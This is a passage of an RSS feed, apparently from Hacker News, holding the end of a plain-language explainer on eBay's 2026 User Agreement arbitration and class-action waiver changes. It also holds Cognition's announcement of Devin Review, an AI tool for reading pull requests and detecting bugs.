      &lt;p&gt;EACH OF US MAY BRING CLAIMS AGAINST THE OTHER ONLY ON AN INDIVIDUAL BASIS AND NOT AS A PLAINTIFF OR CLASS MEMBER IN ANY PURPORTED CLASS, OR REPRESENTATIVE, OR COLLECTIVE BASIS, OR PRIVATE ATTORNEY GENERAL ACTION OR PROCEEDING, NOR OTHERWISE TO SEEK RECOVERY OF LOSSES OR DAMAGES (WHETHER FOR YOURSELF OR OTHERS) INCURRED BY A THIRD PARTY, AND THE PARTIES HEREBY WAIVE ALL RIGHTS TO HAVE ANY DISPUTE BE BROUGHT, HEARD, ADMINISTERED, RESOLVED, OR ARBITRATED ON A CLASS, COLLECTIVE, OR REPRESENTATIVE BASIS. ONLY INDIVIDUAL RELIEF IS AVAILABLE.&lt;/p&gt;
      &lt;p&gt;Subject to this Agreement to Arbitrate, the arbitrator may award declaratory or injunctive relief only in favor of the individual party seeking relief and only to the extent necessary to provide relief warranted by the party’s individual claim. Nothing in this paragraph is intended to, nor shall it, affect the terms and conditions under Section 19.B.7 ("Batch Arbitration").&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Here's what that means in plain language:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;“Not as a plaintiff or class member” — prevents someone from joining an existing class action.&lt;/item&gt;
      &lt;item&gt;“No private attorney general actions” — blocks lawsuits brought “on behalf of the public,” a type of claim sometimes used in consumer protection cases.&lt;/item&gt;
      &lt;item&gt;“Nor… for losses incurred by a third party” — prevents a person from trying to recover damages suffered by someone else.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Note: this language does not in any way change or restrict legal action that state Attorneys General, the FTC or other regulatory or legal agencies can take on behalf of sellers and/or consumers - so don't be dissuaded from letting those agencies know about your experiences with the platform, like the recent changes to Promoted Listings ad attribution policies.&lt;/p&gt;
    &lt;p&gt;And finally, this User Agreement update has been changed to clarify that only new users may request to opt out of arbitration agreement - existing users missed their opportunity if they did not opt out before May 16, 2025.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Opt-Out Procedure&lt;/p&gt;
      &lt;p&gt;IF YOU ARE A NEW USER OF OUR SERVICES, YOU CAN CHOOSE TO OPT OUT OF THIS AGREEMENT TO ARBITRATE ("OPT OUT") BY MAILING US A WRITTEN OPT-OUT NOTICE ("OPT-OUT NOTICE").&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;And that's it for changes to eBay's User Agreement going into effect February 20, 2026.&lt;/p&gt;
    &lt;p&gt;Let us know in the comments below what you think of these change and how they'll affect your business!&lt;/p&gt;
  &lt;/main&gt;

&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46711574</guid><pubDate>Wed, 21 Jan 2026 21:07:47 +0000</pubDate></item><item><title>Devin Review: AI to Stop Slop</title><link>https://cognition.ai/blog/devin-review</link><description>&lt;doc fingerprint="a084d7d23bb3ffa2"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Devin Review is currently free, while in early release, and works on any public or private GitHub PR. You can use it in three ways:&lt;/p&gt;
      &lt;list rend="ol"&gt;
        &lt;item&gt;Devin users: head to app.devin.ai/review to see all your open PRs. &lt;/item&gt;
        &lt;item&gt;Everyone: swap &lt;code&gt;github&lt;/code&gt; for &lt;code&gt;devinreview&lt;/code&gt; in any PR URL (e.g. https://github.com/org/repo/pull/123 ⇒ https://devinreview.com/org/repo/pull/123). No login needed for public PRs.&lt;/item&gt;
        &lt;item&gt;Everyone: &lt;code&gt;npx devin-review&lt;/code&gt; {pr-link} - run this command inside the PR’s parent repo.&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Check out the docs for more details.&lt;/p&gt;
      &lt;head rend="h2"&gt;The Birth and Stagnation of Code Review&lt;/head&gt;
      &lt;p&gt;15 years ago, GitHub set the standard for PR review... and then stopped there.&lt;/p&gt;
      &lt;p&gt;The first order problem with standard code review is well known - when PRs are small, they're easy to read and argue about. But this breaks down quickly for large reviews. We call this the "Lazy LGTM problem".&lt;/p&gt;
      &lt;p&gt;More broadly, the feeling that people have of extreme productivity with coding agents in their vibecoded prototypes, vs the disappointing feeling that most people actually see in the useful output of their engineers, organizations, and experience as end users, is the great mystery of our time.&lt;/p&gt;
      &lt;p&gt;To paraphrase Winston Churchill: "Never in the field of software engineering has so much code been created by so many, yet shipped to so few."&lt;/p&gt;
      &lt;head rend="h2"&gt;The Modern Code Review Workflow&lt;/head&gt;
      &lt;p&gt;Devin Review adds AI tooling to help you scale your PR understanding, so you quickly and fully understand the code you are about to merge. &lt;/p&gt;
      &lt;p&gt;As you review the PR, Devin helps you in every step:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Reading better: &lt;list rend="ul"&gt;&lt;item&gt;GitHub shows you diffs by alphabetical order. &lt;/item&gt;&lt;item&gt;Solution: intelligent diff organization. PR Review analyzes your code, groups together changes that are logically connected, orders the hunks of code, and explains each hunk, so you can review from top to bottom. It's as if a smart colleague was walking you through the PR.&lt;/item&gt;&lt;item&gt;A quality-of-life improvement: when code is moved or renamed, GitHub shows the changes as full deletes and full writes. We detect what was copied/moved and don’t make a fuss.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
        &lt;item&gt;Asking for more info:&lt;list rend="ul"&gt;&lt;item&gt;When more context is needed on a diff, including context on code outside of the PR, GitHub doesn’t offer any solutions beyond token search.&lt;/item&gt;&lt;item&gt;Solution: Interactive chat. Devin Review pipe your diffs into an inline Ask Devin session with full codebase understanding, so you can chat about the changes, without leaving the review. &lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;/list&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Catching bugs and issues&lt;list rend="ul"&gt;&lt;item&gt;GitHub doesn’t catch bugs in PRs; it relies on your CI/linting. Other bugcatchers in the market are often seen as spammy and low signal.&lt;/item&gt;&lt;item&gt;Solution: AI Bug Detection. Devin Review scans the diffs and generates a list of issues categorized by seriousness: red for probable bugs, and yellow for warnings, and gray for FYI/commentary. &lt;/item&gt;&lt;item&gt;You can copy/paste or dismiss the AI flags, or otherwise just work with fellow humans in normal comment bubbles.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;This is a starting point, and we’ll be pushing frequent updates as our users keep telling us what they want. We hope you'll try out Devin Review and give us feedback!&lt;/p&gt;
